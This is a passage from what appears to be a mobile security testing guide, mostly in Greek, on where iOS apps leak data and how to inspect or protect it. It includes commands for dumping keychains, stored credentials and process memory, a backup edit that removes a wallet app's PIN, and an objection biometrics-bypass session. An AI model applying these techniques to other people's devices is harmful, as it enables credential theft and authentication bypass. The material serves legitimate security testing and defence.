[Couchbase Lite](https://github.com/couchbase/couchbase-lite-ios) περιγράφεται ως μια **ελαφριά** και **ενσωματωμένη** μηχανή βάσης δεδομένων που ακολουθεί την προσέγγιση προσανατολισμένη σε έγγραφα (NoSQL). Έχει σχεδιαστεί για να είναι εγγενές σε **iOS** και **macOS**, και προσφέρει τη δυνατότητα συγχρονισμού δεδομένων απρόσκοπτα.

Για να εντοπίσετε πιθανές βάσεις δεδομένων Couchbase σε μια συσκευή, ο παρακάτω κατάλογος πρέπει να ελεγχθεί:
```bash
ls /private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support/
```
### Cookies

Το iOS αποθηκεύει τα cookies των εφαρμογών στο **`Library/Cookies/cookies.binarycookies`** μέσα στον φάκελο κάθε εφαρμογής. Ωστόσο, οι προγραμματιστές μερικές φορές επιλέγουν να τα αποθηκεύσουν στο **keychain**, διότι το προαναφερθέν **cookie file** μπορεί να προσπελαστεί από backups.

Για να εξετάσετε το cookie file μπορείτε να χρησιμοποιήσετε [**this python script**](https://github.com/mdegrazia/Safari-Binary-Cookie-Parser) ή να χρησιμοποιήσετε το objection's **`ios cookies get`.**\
**Μπορείτε επίσης να χρησιμοποιήσετε το objection για να** μετατρέψετε αυτά τα αρχεία σε μορφή JSON και να εξετάσετε τα δεδομένα.
```bash
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios cookies get --json
[
{
"domain": "highaltitudehacks.com",
"expiresDate": "2051-09-15 07:46:43 +0000",
"isHTTPOnly": "false",
"isSecure": "false",
"name": "username",
"path": "/",
"value": "admin123",
"version": "0"
}
]
```
### Cache

By default NSURLSession stores data, such as **HTTP requests and responses in the Cache.db** database. This database can contain **ευαίσθητα δεδομένα**, if tokens, usernames or any other sensitive information has been cached. To find the cached information open the data directory of the app (`/var/mobile/Containers/Data/Application/<UUID>`) and go to `/Library/Caches/<Bundle Identifier>`. The **WebKit cache is also being stored in the Cache.db** file. **Objection** can open and interact with the database with the command `sqlite connect Cache.db`, as it is a **κανονική SQLite βάση δεδομένων**.

It is **recommended to disable Caching this data**, as it may contain sensitive information in the request or response. The following list below shows different ways of achieving this:

1.  It is recommended to remove Cached responses after logout. This can be done with the provided method by Apple called [`removeAllCachedResponses`](https://developer.apple.com/documentation/foundation/urlcache/1417802-removeallcachedresponses) You can call this method as follows:

`URLCache.shared.removeAllCachedResponses()`

This method will remove all cached requests and responses from Cache.db file.

2.  If you don't need to use the advantage of cookies it would be recommended to just use the [.ephemeral](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral) configuration property of URLSession, which will disable saving cookies and Caches.

[Apple documentation](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral):

`Ένα αντικείμενο διαμόρφωσης ephemeral session είναι παρόμοιο με μια default session configuration (βλέπε default), εκτός ότι το αντίστοιχο αντικείμενο session δεν αποθηκεύει caches, credential stores, ή οποιαδήποτε δεδομένα σχετικά με τη συνεδρία στο δίσκο. Αντίθετα, τα δεδομένα της συνεδρίας αποθηκεύονται στη RAM. Η μόνη φορά που ένα ephemeral session γράφει δεδομένα στο δίσκο είναι όταν του πείτε να γράψει τα περιεχόμενα ενός URL σε ένα αρχείο.`

3.  Cache can be also disabled by setting the Cache Policy to [.notAllowed](https://developer.apple.com/documentation/foundation/urlcache/storagepolicy/notallowed). It will disable storing Cache in any fashion, either in memory or on disk.

### Snapshots

Whenever you press the home button, iOS **takes a snapshot of the current screen** to be able to do the transition to the application on a much smoother way. However, if **ευαίσθητα** **δεδομένα** is present in the current screen, it will be **saved** in the **image** (which **διατηρείται** **μετά** **από** **επαναεκκινήσεις**). These are the snapshots that you can also access double tapping the home screen to switch between apps.

Unless the iPhone is jailbroken, the **attacker** needs to have **access** to the **device** **unblocked** to see these screenshots. By default the last snapshot is stored in the application's sandbox in `Library/Caches/Snapshots/` or `Library/SplashBoard/Snapshots` folder (the trusted computers can' t access the filesystem from iOX 7.0).

Once way to prevent this bad behaviour is to put a blank screen or remove the sensitive data before taking the snapshot using the `ApplicationDidEnterBackground()` function.

The following is a sample remediation method that will set a default screenshot.

Swift:
```swift
private var backgroundImage: UIImageView?

func applicationDidEnterBackground(_ application: UIApplication) {
let myBanner = UIImageView(image: #imageLiteral(resourceName: "overlayImage"))
myBanner.frame = UIScreen.main.bounds
backgroundImage = myBanner
window?.addSubview(myBanner)
}

func applicationWillEnterForeground(_ application: UIApplication) {
backgroundImage?.removeFromSuperview()
}
```
Objective-C:
```
@property (UIImageView *)backgroundImage;

- (void)applicationDidEnterBackground:(UIApplication *)application {
UIImageView *myBanner = [[UIImageView alloc] initWithImage:@"overlayImage.png"];
self.backgroundImage = myBanner;
self.backgroundImage.bounds = UIScreen.mainScreen.bounds;
[self.window addSubview:myBanner];
}

- (void)applicationWillEnterForeground:(UIApplication *)application {
[self.backgroundImage removeFromSuperview];
}
```
Αυτό ορίζει την εικόνα φόντου σε `overlayImage.png` κάθε φορά που η εφαρμογή μπαίνει στο background. Αυτό αποτρέπει sensitive data leaks επειδή το `overlayImage.png` θα υπερκαλύπτει πάντα την τρέχουσα προβολή.

### Keychain

Για πρόσβαση και διαχείριση του iOS keychain, εργαλεία όπως [**Keychain-Dumper**](https://github.com/ptoomey3/Keychain-Dumper) είναι διαθέσιμα, κατάλληλα για jailbroken συσκευές. Επιπλέον, [**Objection**](https://github.com/sensepost/objection) παρέχει την εντολή `ios keychain dump` για παρόμοιους σκοπούς.

#### **Storing Credentials**

Η κλάση **NSURLCredential** είναι ιδανική για την αποθήκευση ευαίσθητων πληροφοριών απευθείας στο keychain, παρακάμπτοντας την ανάγκη για NSUserDefaults ή άλλους wrappers. Για να αποθηκεύσετε credentials μετά το login, ο παρακάτω κώδικας Swift χρησιμοποιείται:
```swift
NSURLCredential *credential;
credential = [NSURLCredential credentialWithUser:username password:password persistence:NSURLCredentialPersistencePermanent];
[[NSURLCredentialStorage sharedCredentialStorage] setCredential:credential forProtectionSpace:self.loginProtectionSpace];
```
Για την εξαγωγή αυτών των αποθηκευμένων διαπιστευτηρίων, χρησιμοποιείται η εντολή του Objection `ios nsurlcredentialstorage dump`.

## **Προσαρμοσμένα Πληκτρολόγια και Κρυφή Μνήμη Πληκτρολογίου**

Από το iOS 8.0 και μετά, οι χρήστες μπορούν να εγκαταστήσουν προσαρμοσμένες επεκτάσεις πληκτρολογίου, τις οποίες μπορούν να διαχειριστούν μέσω του **Settings > General > Keyboard > Keyboards**. Ενώ αυτά τα πληκτρολόγια προσφέρουν επιπλέον λειτουργικότητα, ενέχουν κίνδυνο καταγραφής πατημάτων πλήκτρων και αποστολής δεδομένων σε εξωτερικούς διακομιστές, αν και οι χρήστες ειδοποιούνται για πληκτρολόγια που απαιτούν πρόσβαση στο δίκτυο. Οι εφαρμογές μπορούν, και θα πρέπει, να περιορίζουν τη χρήση προσαρμοσμένων πληκτρολογίων για την εισαγωγή ευαίσθητων πληροφοριών.

**Συστάσεις Ασφαλείας:**

- Συνιστάται να απενεργοποιούνται τα τρίτα πληκτρολόγια για αυξημένη ασφάλεια.
- Να έχετε υπόψη σας τις λειτουργίες autocorrect και auto-suggestions του προεπιλεγμένου πληκτρολογίου iOS, οι οποίες ενδέχεται να αποθηκεύουν ευαίσθητες πληροφορίες σε αρχεία cache που βρίσκονται στο `Library/Keyboard/{locale}-dynamic-text.dat` ή στο `/private/var/mobile/Library/Keyboard/dynamic-text.dat`. Αυτά τα αρχεία cache θα πρέπει να ελέγχονται τακτικά για ευαίσθητα δεδομένα. Συνιστάται η επαναφορά του λεξικού πληκτρολογίου μέσω **Settings > General > Reset > Reset Keyboard Dictionary** για τον καθαρισμό των αποθηκευμένων δεδομένων.
- Η παρεμβολή στην κυκλοφορία δικτύου μπορεί να αποκαλύψει εάν ένα προσαρμοσμένο πληκτρολόγιο μεταδίδει πατήματα πλήκτρων απομακρυσμένα.

### **Αποτροπή Αποθήκευσης Πεδίων Κειμένου**

Το [UITextInputTraits protocol](https://developer.apple.com/reference/uikit/uitextinputtraits) παρέχει ιδιότητες για τη διαχείριση του autocorrection και του secure text entry, απαραίτητες για την αποτροπή της αποθήκευσης ευαίσθητων πληροφοριών. Για παράδειγμα, η απενεργοποίηση του autocorrection και η ενεργοποίηση του secure text entry μπορούν να επιτευχθούν με:
```objectivec
textObject.autocorrectionType = UITextAutocorrectionTypeNo;
textObject.secureTextEntry = YES;
```
Επιπλέον, οι προγραμματιστές πρέπει να διασφαλίζουν ότι τα πεδία κειμένου, ειδικά αυτά για την εισαγωγή ευαίσθητων πληροφοριών όπως passwords και PINs, απενεργοποιούν την προσωρινή αποθήκευση ρυθμίζοντας την `autocorrectionType` σε `UITextAutocorrectionTypeNo` και την `secureTextEntry` σε `YES`.
```objectivec
UITextField *textField = [[UITextField alloc] initWithFrame:frame];
textField.autocorrectionType = UITextAutocorrectionTypeNo;
```
## **Logs**

Η αποσφαλμάτωση του κώδικα συχνά περιλαμβάνει τη χρήση του **logging**. Υπάρχει κίνδυνος καθώς τα **logs μπορεί να περιέχουν ευαίσθητες πληροφορίες**. Προηγουμένως, στο iOS 6 και σε προγενέστερες εκδόσεις, τα logs ήταν προσβάσιμα από όλες τις εφαρμογές, δημιουργώντας κίνδυνο διαρροής ευαίσθητων δεδομένων. **Τώρα, οι εφαρμογές περιορίζονται στην πρόσβαση μόνο στα δικά τους logs**.

Παρά αυτούς τους περιορισμούς, ένας **επιτιθέμενος με φυσική πρόσβαση** σε μια ξεκλείδωτη συσκευή μπορεί να το εκμεταλλευτεί συνδέοντας τη συσκευή με έναν υπολογιστή και **να διαβάσει τα logs**. Είναι σημαντικό να σημειωθεί ότι τα logs παραμένουν στον δίσκο ακόμα και μετά την απεγκατάσταση της εφαρμογής.

Για να μειωθούν οι κίνδυνοι, συνιστάται να **αλληλεπιδράσετε διεξοδικά με την εφαρμογή**, εξερευνώντας όλες τις λειτουργίες και τα πεδία εισόδου για να βεβαιωθείτε ότι δεν καταγράφονται κατά λάθος ευαίσθητες πληροφορίες.

Κατά την ανασκόπηση του πηγαίου κώδικα της εφαρμογής για potential leaks, ψάξτε τόσο για **προκαθορισμένες** όσο και για **προσαρμοσμένες δηλώσεις logging** που χρησιμοποιούν λέξεις-κλειδιά όπως `NSLog`, `NSAssert`, `NSCAssert`, `fprintf` για ενσωματωμένες συναρτήσεις, και οποιεσδήποτε αναφορές σε `Logging` ή `Logfile` για custom υλοποιήσεις.

### **Παρακολούθηση Συστημικών Logs**

Οι εφαρμογές καταγράφουν διάφορες πληροφορίες που μπορεί να είναι ευαίσθητες. Για να παρακολουθήσετε αυτά τα logs, εργαλεία και εντολές όπως:
```bash
idevice_id --list   # To find the device ID
idevicesyslog -u <id> (| grep <app>)   # To capture the device logs
```
είναι χρήσιμα. Επιπλέον, το **Xcode** παρέχει έναν τρόπο για τη συλλογή των console logs:

1. Ανοίξτε το **Xcode**.
2. Συνδέστε τη συσκευή iOS.
3. Μεταβείτε στο **Window** -> **Devices and Simulators**.
4. Επιλέξτε τη συσκευή σας.
5. Προκαλέστε το πρόβλημα που διερευνάτε.
6. Χρησιμοποιήστε το κουμπί **Open Console** για να δείτε τα logs σε νέο παράθυρο.

Για πιο προχωρημένη καταγραφή, η σύνδεση στο shell της συσκευής και η χρήση του **socat** μπορούν να παρέχουν παρακολούθηση logs σε πραγματικό χρόνο:
```bash
iPhone:~ root# socat - UNIX-CONNECT:/var/run/lockdown/syslog.sock
```
Ακολουθούν εντολές για παρακολούθηση δραστηριοτήτων στα logs, που μπορούν να φανούν ανεκτίμητες για τη διάγνωση προβλημάτων ή τον εντοπισμό πιθανής data leakage.

## Αντίγραφα ασφαλείας

Τα χαρακτηριστικά Auto-backup είναι ενσωματωμένα στο iOS, διευκολύνοντας τη δημιουργία αντιγράφων των δεδομένων της συσκευής μέσω iTunes (έως macOS Catalina), Finder (από macOS Catalina και μετά), ή iCloud. Αυτά τα backups περιλαμβάνουν σχεδόν όλα τα δεδομένα της συσκευής, εξαιρουμένων πολύ ευαίσθητων στοιχείων όπως λεπτομέρειες Apple Pay και ρυθμίσεις Touch ID.

### Κίνδυνοι Ασφαλείας

Η συμπερίληψη των εγκατεστημένων apps και των δεδομένων τους στα backups εγείρει το ζήτημα πιθανής data leakage και τον κίνδυνο ότι τροποποιήσεις στο backup θα μπορούσαν να αλλάξουν τη λειτουργικότητα της εφαρμογής. Συνιστάται να μην αποθηκεύετε ευαίσθητες πληροφορίες σε plaintext μέσα στον κατάλογο οποιασδήποτε εφαρμογής ή στα υποκατάλογά του, για να μετριαστούν αυτοί οι κίνδυνοι.

### Εξαίρεση αρχείων από τα backups

Αρχεία στο `Documents/` και `Library/Application Support/` γίνονται backup από προεπιλογή. Οι developers μπορούν να εξαιρέσουν συγκεκριμένα αρχεία ή καταλόγους από τα backups χρησιμοποιώντας `NSURL setResourceValue:forKey:error:` με το `NSURLIsExcludedFromBackupKey`. Αυτή η πρακτική είναι κρίσιμη για την προστασία ευαίσθητων δεδομένων ώστε να μην περιλαμβάνονται στα backups.

### Έλεγχος για Ευπάθειες

Για να αξιολογήσετε την ασφάλεια των backups μιας εφαρμογής, ξεκινήστε δημιουργώντας ένα backup με το Finder, και στη συνέχεια εντοπίστε το ακολουθώντας τις οδηγίες από [Apple's official documentation](https://support.apple.com/en-us/HT204215). Αναλύστε το backup για ευαίσθητα δεδομένα ή ρυθμίσεις που θα μπορούσαν να αλλαχθούν και να επηρεάσουν τη συμπεριφορά της εφαρμογής.

Ευαίσθητες πληροφορίες μπορούν να αναζητηθούν χρησιμοποιώντας εργαλεία γραμμής εντολών ή εφαρμογές όπως [iMazing](https://imazing.com). Για κρυπτογραφημένα backups, η παρουσία κρυπτογράφησης μπορεί να επιβεβαιωθεί ελέγχοντας το κλειδί "IsEncrypted" στο αρχείο "Manifest.plist" στη ρίζα του backup.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
...
<key>Date</key>
<date>2021-03-12T17:43:33Z</date>
<key>IsEncrypted</key>
<true/>
...
</plist>
```
Για την αντιμετώπιση κρυπτογραφημένων backup, Python scripts διαθέσιμα στο [DinoSec's GitHub repo](https://github.com/dinosec/iphone-dataprotection/tree/master/python_scripts), όπως τα **backup_tool.py** και **backup_passwd.py**, μπορεί να φανούν χρήσιμα, αν και πιθανόν να απαιτούν προσαρμογές για συμβατότητα με τις τελευταίες εκδόσεις του iTunes/Finder. Το [**iOSbackup** tool](https://pypi.org/project/iOSbackup/) είναι μια άλλη επιλογή για πρόσβαση σε αρχεία μέσα σε backup προστατευμένα με κωδικό.

### Τροποποίηση Συμπεριφοράς Εφαρμογής

Ένα παράδειγμα αλλαγής της συμπεριφοράς μιας εφαρμογής μέσω τροποποιήσεων backup εμφανίζεται στην [Bither bitcoin wallet app](https://github.com/bither/bither-ios), όπου το UI lock PIN αποθηκεύεται μέσα στο `net.bither.plist` κάτω από το κλειδί **pin_code**. Η αφαίρεση αυτού του κλειδιού από το plist και η επαναφορά του backup αφαιρεί την απαίτηση PIN, παρέχοντας απεριόριστη πρόσβαση.

## Περίληψη για τις Δοκιμές Μνήμης για Ευαίσθητα Δεδομένα

Όταν ασχολείστε με ευαίσθητες πληροφορίες που αποθηκεύονται στη μνήμη μιας εφαρμογής, είναι κρίσιμο να περιορίζεται ο χρόνος έκθεσης αυτών των δεδομένων. Υπάρχουν δύο κύριες προσεγγίσεις για την έρευνα του περιεχομένου μνήμης: **creating a memory dump** και **analyzing the memory in real time**. Και οι δύο μέθοδοι έχουν προκλήσεις, συμπεριλαμβανομένης της πιθανότητας να χαθούν κρίσιμα δεδομένα κατά τη διαδικασία dump ή την ανάλυση.

## **Ανάκτηση και Ανάλυση ενός Memory Dump**

Για συσκευές τόσο jailbroken όσο και non-jailbroken, εργαλεία όπως [objection](https://github.com/sensepost/objection) και [Fridump](https://github.com/Nightbringer21/fridump) επιτρέπουν το dumping της μνήμης διεργασίας μιας εφαρμογής. Αφού γίνει το dump, η ανάλυση αυτών των δεδομένων απαιτεί διάφορα εργαλεία, ανάλογα με τη φύση των πληροφοριών που αναζητάτε.

Για την εξαγωγή strings από ένα memory dump, εντολές όπως `strings` ή `rabin2 -zz` μπορούν να χρησιμοποιηθούν:
```bash
# Extracting strings using strings command
$ strings memory > strings.txt

# Extracting strings using rabin2
$ rabin2 -ZZ memory > strings.txt
```
Για πιο λεπτομερή ανάλυση, όπως η αναζήτηση συγκεκριμένων τύπων δεδομένων ή προτύπων, το **radare2** προσφέρει εκτεταμένες δυνατότητες αναζήτησης:
```bash
$ r2 <name_of_your_dump_file>
[0x00000000]> /?
...
```
## **Runtime Memory Analysis**

Το **r2frida** παρέχει μια ισχυρή εναλλακτική για την επιθεώρηση της memory μιας εφαρμογής σε πραγματικό χρόνο, χωρίς να απαιτείται memory dump. Αυτό το εργαλείο επιτρέπει την εκτέλεση εντολών αναζήτησης απευθείας στη memory της εφαρμογής που εκτελείται:
```bash
$ r2 frida://usb//<name_of_your_app>
[0x00000000]> /\ <search_command>
```
## Κατεστραμμένη Κρυπτογραφία

### Κακές Διαδικασίες Διαχείρισης Κλειδιών

Κάποιοι προγραμματιστές αποθηκεύουν ευαίσθητα δεδομένα στην τοπική αποθήκευση και τα κρυπτογραφούν με ένα κλειδί hardcoded/predictable μέσα στον κώδικα. Αυτό δεν πρέπει να γίνεται καθώς κάποιο reversing μπορεί να επιτρέψει σε επιτιθέμενους να εξάγουν τις εμπιστευτικές πληροφορίες.

### Χρήση Μη Ασφαλών και/ή Απαρχαιωμένων Αλγορίθμων

Οι προγραμματιστές δεν θα πρέπει να χρησιμοποιούν **deprecated algorithms** για να πραγματοποιούν έλεγχο εξουσιοδότησης (authorisation), να αποθηκεύουν ή να αποστέλλουν δεδομένα. Μερικοί από αυτούς τους αλγορίθμους είναι: RC4, MD4, MD5, SHA1... Αν χρησιμοποιούνται **hashes** για την αποθήκευση κωδικών πρόσβασης, για παράδειγμα, θα πρέπει να χρησιμοποιούνται **hashes** brute-force **resistant** με salt.

### Έλεγχος

Οι κύριοι έλεγχοι που πρέπει να διενεργηθούν είναι αν μπορείτε να βρείτε **hardcoded** κωδικούς/μυστικά μέσα στον κώδικα, αν αυτά είναι **predictable**, και αν ο κώδικας χρησιμοποιεί κάποιο είδος **weak** **cryptography** αλγορίθμων.

Είναι χρήσιμο να γνωρίζετε ότι μπορείτε να **monitor** κάποιες **crypto** **libraries** αυτόματα χρησιμοποιώντας **objection** με:
```swift
ios monitor crypt
```
Για **περισσότερες πληροφορίες** σχετικά με τα iOS cryptographic APIs και τις βιβλιοθήκες, επισκεφθείτε [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography)

## Τοπική Αυθεντικοποίηση

Η τοπική αυθεντικοποίηση παίζει κρίσιμο ρόλο, ειδικά όταν αφορά την προστασία πρόσβασης σε ένα απομακρυσμένο endpoint μέσω κρυπτογραφικών μεθόδων. Η ουσία είναι ότι χωρίς σωστή υλοποίηση, οι μηχανισμοί τοπικής αυθεντικοποίησης μπορούν να παρακαμφθούν.

Η Apple παρέχει μέσω του [**Local Authentication framework**](https://developer.apple.com/documentation/localauthentication) και του [**keychain**](https://developer.apple.com/library/content/documentation/Security/Conceptual/keychainServConcepts/01introduction/introduction.html) ισχυρά APIs ώστε οι προγραμματιστές να εμφανίζουν διαλόγους αυθεντικοποίησης χρήστη και να χειρίζονται με ασφάλεια μυστικά δεδομένα, αντίστοιχα. Το Secure Enclave προστατεύει τα δεδομένα δακτυλικού αποτυπώματος για το Touch ID, ενώ το Face ID βασίζεται στην αναγνώριση προσώπου χωρίς να θέτει σε κίνδυνο τα βιομετρικά δεδομένα.

Για να ενσωματώσουν το Touch ID/Face ID, οι προγραμματιστές έχουν δύο επιλογές API:

- **`LocalAuthentication.framework`** για υψηλού επιπέδου αυθεντικοποίηση χρήστη χωρίς πρόσβαση στα βιομετρικά δεδομένα.
- **`Security.framework`** για χαμηλότερου επιπέδου πρόσβαση σε υπηρεσίες keychain, εξασφαλίζοντας μυστικά δεδομένα με βιομετρική αυθεντικοποίηση. Διάφορα [open-source wrappers](https://www.raywenderlich.com/147308/secure-ios-user-data-keychain-touch-id) απλοποιούν την πρόσβαση στο keychain.

> [!CAUTION]
> Ωστόσο, και τα δύο `LocalAuthentication.framework` και `Security.framework` παρουσιάζουν ευπάθειες, καθώς επιστρέφουν κυρίως boolean τιμές χωρίς να μεταφέρουν δεδομένα για τις διαδικασίες αυθεντικοποίησης, καθιστώντας τα ευάλωτα σε παρακάμψεις (αναφορά: [Don't touch me that way, by David Lindner et al](https://www.youtube.com/watch?v=XhXIHVGCFFM)).

### Υλοποίηση Τοπικής Αυθεντικοποίησης

Για να ζητήσουν από χρήστες να αυθεντικοποιηθούν, οι προγραμματιστές πρέπει να χρησιμοποιήσουν τη μέθοδο **`evaluatePolicy`** μέσα στην κλάση **`LAContext`**, επιλέγοντας μεταξύ:

- **`deviceOwnerAuthentication`**: Ζητά Touch ID ή κωδικό συσκευής, αποτυγχάνει αν κανένα δεν είναι ενεργοποιημένο.
- **`deviceOwnerAuthenticationWithBiometrics`**: Ζητά αποκλειστικά Touch ID.

Μια επιτυχημένη αυθεντικοποίηση υποδεικνύεται από μια boolean τιμή επιστροφής από τη **`evaluatePolicy`**, κάτι που υπογραμμίζει πιθανό κενό ασφαλείας.

### Τοπική Αυθεντικοποίηση χρησιμοποιώντας Keychain

Η υλοποίηση τοπικής αυθεντικοποίησης σε εφαρμογές iOS περιλαμβάνει τη χρήση των keychain APIs για την ασφαλή αποθήκευση μυστικών δεδομένων, όπως authentication tokens. Αυτή η διαδικασία διασφαλίζει ότι τα δεδομένα μπορούν να προσπελαστούν μόνο από τον χρήστη, χρησιμοποιώντας τον κωδικό της συσκευής ή βιομετρική αυθεντικοποίηση όπως το Touch ID.

Το keychain προσφέρει τη δυνατότητα να ορίσετε αντικείμενα με το χαρακτηριστικό `SecAccessControl`, το οποίο περιορίζει την πρόσβαση στο αντικείμενο μέχρι ο χρήστης να αυθεντικοποιηθεί επιτυχώς μέσω Touch ID ή του κωδικού της συσκευής. Αυτή η λειτουργία είναι κρίσιμη για την ενίσχυση της ασφάλειας.

Παρακάτω υπάρχουν παραδείγματα κώδικα σε Swift και Objective-C που δείχνουν πώς να αποθηκεύσετε και να ανακτήσετε μια συμβολοσειρά στο/από το keychain, αξιοποιώντας αυτές τις λειτουργίες ασφαλείας. Τα παραδείγματα δείχνουν συγκεκριμένα πώς να ρυθμίσετε τον έλεγχο πρόσβασης ώστε να απαιτείται αυθεντικοποίηση Touch ID και να διασφαλίσετε ότι τα δεδομένα είναι προσβάσιμα μόνο στη συσκευή όπου ρυθμίστηκαν, υπό την προϋπόθεση ότι έχει διαμορφωθεί κωδικός συσκευής.

{{#tabs}}
{{#tab name="Swift"}}
```swift
// From https://github.com/mufambisi/owasp-mstg/blob/master/Document/0x06f-Testing-Local-Authentication.md

// 1. create AccessControl object that will represent authentication settings

var error: Unmanaged<CFError>?

guard let accessControl = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
SecAccessControlCreateFlags.biometryCurrentSet,
&error) else {
// failed to create AccessControl object

return
}

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute

var query: [String: Any] = [:]

query[kSecClass as String] = kSecClassGenericPassword
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecAttrAccount as String] = "OWASP Account" as CFString
query[kSecValueData as String] = "test_strong_password".data(using: .utf8)! as CFData
query[kSecAttrAccessControl as String] = accessControl

// 3. save item

let status = SecItemAdd(query as CFDictionary, nil)

if status == noErr {
// successfully saved
} else {
// error while saving
}
```
{{#endtab}}

{{#tab name="Objective-C"}}
```objectivec
// 1. create AccessControl object that will represent authentication settings
CFErrorRef *err = nil;

SecAccessControlRef sacRef = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
kSecAccessControlUserPresence,
err);

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute
NSDictionary* query = @{
(_ _bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecAttrLabel: @"com.me.myapp.password",
(__bridge id)kSecAttrAccount: @"OWASP Account",
(__bridge id)kSecValueData: [@"test_strong_password" dataUsingEncoding:NSUTF8StringEncoding],
(__bridge id)kSecAttrAccessControl: (__bridge_transfer id)sacRef
};

// 3. save item
OSStatus status = SecItemAdd((__bridge CFDictionaryRef)query, nil);

if (status == noErr) {
// successfully saved
} else {
// error while saving
}
```
{{#endtab}}
{{#endtabs}}

Τώρα μπορούμε να ζητήσουμε το αποθηκευμένο αντικείμενο από το keychain. Οι υπηρεσίες keychain θα εμφανίσουν στον χρήστη το διάλογο πιστοποίησης και θα επιστρέψουν δεδομένα ή nil ανάλογα με το αν παρασχέθηκε κατάλληλο fingerprint ή όχι.

{{#tabs}}
{{#tab name="Swift"}}
```swift
// 1. define query
var query = [String: Any]()
query[kSecClass as String] = kSecClassGenericPassword
query[kSecReturnData as String] = kCFBooleanTrue
query[kSecAttrAccount as String] = "My Name" as CFString
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecUseOperationPrompt as String] = "Please, pass authorisation to enter this area" as CFString

// 2. get item
var queryResult: AnyObject?
let status = withUnsafeMutablePointer(to: &queryResult) {
SecItemCopyMatching(query as CFDictionary, UnsafeMutablePointer($0))
}

if status == noErr {
let password = String(data: queryResult as! Data, encoding: .utf8)!
// successfully received password
} else {
// authorization not passed
}
```
{{#endtab}}

{{#tab name="Objective-C"}}
```objectivec
// 1. define query
NSDictionary *query = @{(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecAttrAccount: @"My Name1",
(__bridge id)kSecAttrLabel: @"com.me.myapp.password",
(__bridge id)kSecUseOperationPrompt: @"Please, pass authorisation to enter this area" };

// 2. get item
CFTypeRef queryResult = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, &queryResult);

if (status == noErr){
NSData* resultData = ( __bridge_transfer NSData* )queryResult;
NSString* password = [[NSString alloc] initWithData:resultData encoding:NSUTF8StringEncoding];
NSLog(@"%@", password);
} else {
NSLog(@"Something went wrong");
}
```
{{#endtab}}
{{#endtabs}}

### Detection

Η χρήση frameworks σε μια εφαρμογή μπορεί επίσης να ανιχνευθεί αναλύοντας τη λίστα των shared dynamic libraries του app binary. Αυτό μπορεί να γίνει χρησιμοποιώντας `otool`:
```bash
$ otool -L <AppName>.app/<AppName>
```
Εάν το `LocalAuthentication.framework` χρησιμοποιείται σε μια εφαρμογή, η έξοδος θα περιέχει και τις δύο από τις παρακάτω γραμμές (θυμηθείτε ότι το `LocalAuthentication.framework` χρησιμοποιεί το `Security.framework` στο παρασκήνιο):
```bash
/System/Library/Frameworks/LocalAuthentication.framework/LocalAuthentication
/System/Library/Frameworks/Security.framework/Security
```
Αν χρησιμοποιείται το `Security.framework`, θα εμφανιστεί μόνο το δεύτερο.

### Bypass του Local Authentication Framework

#### **Objection**

Μέσω του **Objection Biometrics Bypass**, που βρίσκεται σε [this GitHub page](https://github.com/sensepost/objection/wiki/Understanding-the-iOS-Biometrics-Bypass), υπάρχει μια τεχνική για την υπέρβαση του μηχανισμού **LocalAuthentication**. Ο πυρήνας αυτής της προσέγγισης περιλαμβάνει τη χρήση του **Frida** για να χειριστεί τη συνάρτηση `evaluatePolicy`, διασφαλίζοντας ότι αυτή επιστρέφει σταθερά `True`, ανεξαρτήτως της πραγματικής επιτυχίας της πιστοποίησης. Αυτό είναι ιδιαίτερα χρήσιμο για την παράκαμψη ελαττωματικών διαδικασιών βιομετρικής αυθεντικοποίησης.

Για να ενεργοποιηθεί αυτή η παράκαμψη, χρησιμοποιείται η ακόλουθη εντολή:
```bash
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios ui biometrics_bypass
(agent) Registering job 3mhtws9x47q. Type: ios-biometrics-disable
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # (agent) [3mhtws9x47q] Localized Reason for auth requirement: Please authenticate yourself
(agent) [3mhtws9x47q] OS authentication response: false
(agent) [3mhtws9x47q] Marking OS response as True instead
(agent) [3mhtws9x47q] Biometrics bypass hook complete
```
Αυτή η εντολή ξεκινά μια ακολουθία όπου το Objection καταχωρεί ένα task που στην ουσία αλλάζει το αποτέλεσμα του ελέγχου `evaluatePolicy` σε `True`.

#### Frida

Ένα παράδειγμα χρήσης του **`evaluatePolicy`** από το [DVIA-v2 application](https://github.com/prateek147/DVIA-v2):
```swift
+(void)authenticateWithTouchID {
LAContext *myContext = [[LAContext alloc] init];
NSError *authError = nil;
NSString *myLocalizedReasonString = @"Please authenticate yourself";

if ([myContext canEvaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics error:&authError]) {
[myContext evaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics
localizedReason:myLocalizedReasonString
reply:^(BOOL success, NSError *error) {
if (success) {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Authentication Successful" withTitle:@"Success"];
});
} else {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Authentication Failed !" withTitle:@"Error"];
});
}
}];
